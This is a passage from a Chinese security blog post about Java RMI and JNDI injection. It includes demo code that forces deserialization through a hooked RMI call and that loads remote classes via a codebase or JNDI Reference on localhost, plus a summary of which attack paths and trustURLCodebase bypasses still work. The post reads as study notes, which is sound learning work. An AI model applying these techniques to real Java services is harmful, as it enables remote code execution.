var1.readLong();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readFloat();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readDouble();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Unrecognized primitive type: "</span> + var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var0 == String.class &amp;&amp; var1 <span class="keyword">instanceof</span> ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要不是 Interger, String 等直接用对应方法读出的原始类, 就算不是接口类也能通过运行时强行改参数去打, 刚好可以结合之前写的 rasp 完成.  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmb122.easyrasp.hooks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rmb122.easyrasp.annotation.HookHandler;</span><br><span class="line"><span class="keyword">import</span> com.rmb122.easyrasp.enums.HookType;</span><br><span class="line"><span class="keyword">import</span> demo.rmb122.DeserializeObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestHook</span> </span>&#123;</span><br><span class="line">    <span class="meta">@HookHandler</span>(hookClass = <span class="string">"java.rmi.server.RemoteObjectInvocationHandler"</span>, hookMethod = <span class="string">"invokeRemoteMethod"</span>, hookType = HookType.BEFORE_RUN)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object[] test(Object self, Object[] args) &#123;</span><br><span class="line">        System.out.println(<span class="string">"test"</span>);</span><br><span class="line">        System.out.println(Arrays.toString((Object[]) args[<span class="number">2</span>]));</span><br><span class="line">        ((Object[]) args[<span class="number">2</span>])[<span class="number">0</span>] = (Object) <span class="keyword">new</span> DeserializeObject();</span><br><span class="line">        <span class="keyword">return</span> args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然弹出异常说类型错误, 但可以成功触发反序列化.  </p>
<h2 id="加载远程类"><a href="#加载远程类" class="headerlink" title="加载远程类"></a>加载远程类</h2><p>RMIServer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.codebase"</span>, <span class="string">"http://127.0.0.1:19132/"</span>);</span><br><span class="line"></span><br><span class="line">        Registry reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RMISecurityManager;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.security.policy"</span>, RMIClient.class.getClassLoader().getResource(<span class="string">"java.policy"</span>).getFile());</span><br><span class="line">        RMISecurityManager securityManager = <span class="keyword">new</span> RMISecurityManager();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.useCodebaseOnly"</span>, <span class="string">"false"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        DeserializeObject deserializeObject = <span class="keyword">new</span> DeserializeObject();</span><br><span class="line">        registry.lookup(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Server 设置一个 <code>java.rmi.server.codebase</code>, 这样客户端在 lookup 时发现用到了一个本地不存在的类, 会去从这个 codebase 上加载.<br>在新版里面已经被修复, 利用起来可以用 <code>marshalsec</code>, 更方便.  </p>
<h1 id="JDNI"><a href="#JDNI" class="headerlink" title="JDNI"></a>JDNI</h1><h2 id="与-RMI-的关系"><a href="#与-RMI-的关系" class="headerlink" title="与 RMI 的关系"></a>与 RMI 的关系</h2><p>JNDI 全名 <code>Java Naming and Directory Interface</code>, 可以看到其实就是将多种协议, 例如远程方法调用 (RMI), 公共对象请求代理体系结构 (CORBA), 轻型目录访问协议 (LDAP) 或域名服务 (DNS). 全部封装到一个接口中, 方便使用.  </p>
<p>所以以下代码:  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        TestObject object = (TestObject) context.lookup(<span class="string">"rmi://localhost:9999/test"</span>);</span><br><span class="line">        object.callMe(<span class="keyword">new</span> DummyImpl());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与 RMIClient 是完全一样的.<br>不同的是 JNDI 在这基础上加了不少功能, </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">10000</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"test"</span>,<span class="string">"com.rmb122"</span>, <span class="string">"http://127.0.0.1:19133/"</span>);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.rebind(<span class="string">"wrapper"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比如这个 Reference, 客户端查询 wrapper 时, 因为是 <code>Reference</code> 且 com.rmb122 这个工厂类不存在, 将会去 codebase <code>http://127.0.0.1:19133/</code> 上加载, 利用方式与 rmi 远程对象加载是一样的.<br>在新版中已经修复, 需要手动打开 <code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</code>. 而且在我亲测的时候, 就算打开也没用了, 返回的是 <code>Reference</code> 对象 233. Debug 了一下发现还需要打开 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>, 这才会真正去用 http 协议加载类. 同时因为这是 JNDI 加的内容, 对 RMIClient 是无效的. 会直接返回 Reference 对象.  </p>
<h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI + LDAP"></a>JNDI + LDAP</h2><p>这其实与 RMI 差不多, 就是换了壳, 不同的地方是 ldap 是有索引等概念的, 可以搜索啊之类的, 且返回的对象也比较复杂, 本身就额外套了一层, 有一些特殊的属性. 具体可以看看底下的参考资料.<br>其中值得一说的是有个属性可以附带反序列化对象, 可以用于高版本 jre 下的 fastjson 打本地反序列化 gadget.  </p>
<h2 id="本地-Class-作为-Reference-Factory"><a href="#本地-Class-作为-Reference-Factory" class="headerlink" title="本地 Class 作为 Reference Factory"></a>本地 Class 作为 Reference Factory</h2><p>上面的是 Reference 是 <code>Reference(&quot;MyClass&quot;,&quot;com.rmb122&quot;, &quot;http://127.0.0.1:19133/&quot;);</code>, 第二个其实就是工厂类, 这里可以利用 <code>org.apache.naming.factory.BeanFactory</code> 这个工厂类来配合, 绕过远程加载的限制. 详细可以看看参考资料 [3].  </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>大概如下:<br>RMI remote codebase:<br>需要 <code>java.rmi.server.useCodebaseOnly=true</code> 且需要设置 SecurityManager, 比较不实用  </p>
<p>RMI 打 Service Provider:<br>如果已知一个接口声明, 大部分情况下可以打.  </p>
<p>RMI 打 Registry:<br>老版本直接用 ysoserial 的 payload 打, 新版本可以尝试用 JRMP Client 的 payload 改一改尝试绕过.  </p>
<p>JNDI + RMI lookup Reference:<br><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> 直接爆出异常<br><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code> 返回 Reference 对象<br>如果要利用需要两个选项都 =true  </p>
<p>JNDI + LDAP lookup Reference:<br><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> 无影响<br><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code> 返回 Reference 对象<br>只需要 com.sun.jndi.ldap.object.trustURLCodebase=true 即可利用  </p>
<p>JNDI + LDAP 打本地反序列化, 或者 RMI 反序列化:<br>目前无限制  </p>
<p>JNDI + LDAP 打本地 Reference Factory:<br>目前无限制  </p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a><br>[2] <a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br>[3] <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br>[4] <a href="https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java" target="_blank" rel="noopener">https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java</a><br>[5] <a href="https://www.cnblogs.com/Welk1n/p/11066397.html" target="_blank" rel="noopener">https://www.cnblogs.com/Welk1n/p/11066397.html</a><br>[6] <a href="http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/" target="_blank" rel="noopener">http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/</a><br>[7] <a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/" target="_blank" rel="noopener">http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/</a><br>[8] <a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a>  </p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>rmb122
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/" title="JAVA JNDI &#x2F; RMI 学习">https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-学习/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章仅仅记录学习过程, 并不保证文章完全正确, 如果你有任何疑问或者找出问题, 欢迎在评论区指正.
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/web/" rel="tag"># web</a>
              <a href="/tags/java/" rel="tag"># java</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/02/01/fastjson-RCE-%E5%88%86%E6%9E%90/" rel="prev" title="fastjson RCE 分析">
      <i class="fa fa-chevron-left"></i> fastjson RCE 分析
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/03/22/JEP-290-%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/" rel="next" title="JEP-290 相关学习">
      JEP-290 相关学习 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI"><span class="nav-number">1.</span> <span class="nav-text">RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#反序列化"><span class="nav-number">1.1.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加载远程类"><span class="nav-number">1.2.</span> <span class="nav-text">加载远程类</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JDNI"><span class="nav-number">2.</span> <span class="nav-text">JDNI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#与-RMI-的关系"><span class="nav-number">2.1.</span> <span class="nav-text">与 RMI 的关系</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI-LDAP"><span class="nav-number">2.2.</span> <span class="nav-text">JNDI + LDAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地-Class-作为-Reference-Factory"><span class="nav-number">2.3.</span> <span class="nav-text">本地 Class 作为 Reference Factory</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="rmb122"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">rmb122</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">67</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/rmb122" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rmb122" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rmb122</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        






<script>
  (function() {
    function leancloudSelector(url) {
      url = encodeURI(url);
      return document.getElementById(url).querySelector('.leancloud-visitors-count');
    }

    function addCount(Counter) {
      var visitors = document.querySelector('.leancloud_visitors');
      var url = decodeURI(visitors.id);
      var title = visitors.dataset.flagTitle;

      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length > 0) {
            var counter = results[0];
            leancloudSelector(url).innerText = counter.time + 1;
            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
              .catch(error => {
                console.error('Failed to save visitor count', error);
              });
          } else {
              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
            
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }

    function showTime(Counter) {
      var visitors = document.querySelectorAll('.leancloud_visitors');
      var entries = [...visitors].map(element => {
        return decodeURI(element.id);
      });

      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
        .then(response => response.json())
        .then(({ results }) => {
          for (let url of entries) {
            let target = results.find(item => item.url === url);
            leancloudSelector(url).innerText = target ? target.time : 0;
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }

    let { app_id, app_key, server_url } = {"enable":true,"app_id":"oWisX9yfxPr6EEXVYiXpOA6q-gzGzoHsz","app_key":"uncoOWuY3UMhnT98zdzJeh5U","server_url":null,"security":true};
    function fetchData(api_server) {
      var Counter = (method, url, data) => {
        return fetch(`${api_server}/1.1${url}`, {
          method,
          headers: {
            'X-LC-Id'     : app_id,
            'X-LC-Key'    : app_key,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      if (CONFIG.page.isPost) {
        if (CONFIG.hostname !== location.hostname) return;
        addCount(Counter);
      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
        showTime(Counter);
      }
    }

    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;

    if (api_server) {
      fetchData(api_server);
    } else {
      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
        .then(response => response.json())
        .then(({ api_server }) => {
          fetchData('https://' + api_server);
        });
    }
  })();
</script>


      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>

<script src="/js/utils.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el         : '#valine-comments',
      path       : location.pathname,
    }, {"enable":true,"appId":"rVVd10sU0t2cjpEvSiQh7av7-MdYXbMMI","appKey":"Y31jyHHMWPckrz1X8Fn9EUi0","notify":false,"verify":true,"placeholder":"Write something here","avatar":"retro","meta":["nick","mail"],"pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null}
    ));
  }, window.Valine);
});
</script>

</body>
</html>
